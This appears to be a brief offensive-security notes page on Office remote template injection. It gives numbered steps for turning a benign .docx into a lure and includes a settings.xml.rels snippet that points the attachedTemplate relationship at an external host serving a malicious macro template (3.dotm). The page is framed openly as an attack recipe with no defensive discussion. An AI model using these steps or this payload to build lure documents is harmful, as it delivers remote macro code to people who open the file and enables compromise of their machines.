# Office Template Injection

***

1. A malicious macro is saved in a Word template .dotm file

2. Benign .docx file is created based on one of the default MS Word Document templates

3. Document from step 2 is saved as .docx

4. Document from step 3 is renamed to .zip

5. Document from step 4 gets unzipped

6. .\word\_rels\settings.xml.rels contains a reference to the template file. That reference gets replaced with a refernce to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).
   
   ```xml
   <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
   <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
   <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://nooranetred.com/3.dotm" TargetMode="External"/></Relationships>
   ```